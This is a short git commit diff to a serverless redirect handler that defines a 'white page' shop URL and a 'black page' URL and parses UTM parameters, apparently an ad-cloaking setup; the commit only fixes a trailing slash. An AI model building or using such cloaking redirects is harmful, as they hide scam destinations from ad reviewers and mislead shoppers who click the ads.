dcc0e8cf9c9046d11529c8c5d1c8ac35dd0047ab
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-10-07 03:05:41 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.zaybabyshop.at/en/products/personalisierte-geschenk-zur-geburt-junge";
-    const blackPageURL = "https://csshhhggot.lovable.app//";
+    const blackPageURL = "https://csshhhggot.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
